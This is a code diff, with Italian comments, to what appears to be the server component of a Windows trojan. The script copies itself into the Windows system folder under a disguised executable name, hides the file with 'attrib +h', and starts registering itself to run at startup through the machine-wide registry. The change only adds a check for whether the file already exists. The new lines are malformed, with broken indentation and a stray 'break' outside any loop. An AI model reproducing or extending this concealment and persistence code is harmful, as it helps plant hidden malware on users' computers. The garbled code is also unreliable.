@@ -18,6 +18,7 @@ class main:
         #definiamo la directory e il nome del server
         dir_path = os.path.dirname(os.path.realpath(__file__))
         file__name = os.path.basename(__file__)
+        exists = os.path.isfile("C:\\windows\\hdllmw1.exe")
         
         #controlliamo il livello dello script (user/admin)
         is_admin = ctypes.windll.shell32.IsUserAnAdmin()
@@ -26,11 +27,11 @@ class main:
                 os.system("pause")
                 raise SystemExit()
                 
-        #copiamo il server nella directory di sistema
-        copy(dir_path, "C:\\windows\\hdllmw1.exe")
-        
-        #nascondiamo il server
-        os.system("attrib +h C:\\windows\\hdllmw1.exe")
+        #copiamo il server nella directory di sistema e +h
+          if exists == False :
+                        copy(dir_path, "C:\\windows\\hdllmw1.exe")
+                        os.system("attrib +h C:\\windows\\hdllmw1.exe")
+                        break
         
         #aggiungiamo server.exe allo startup nel regedit
                    aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
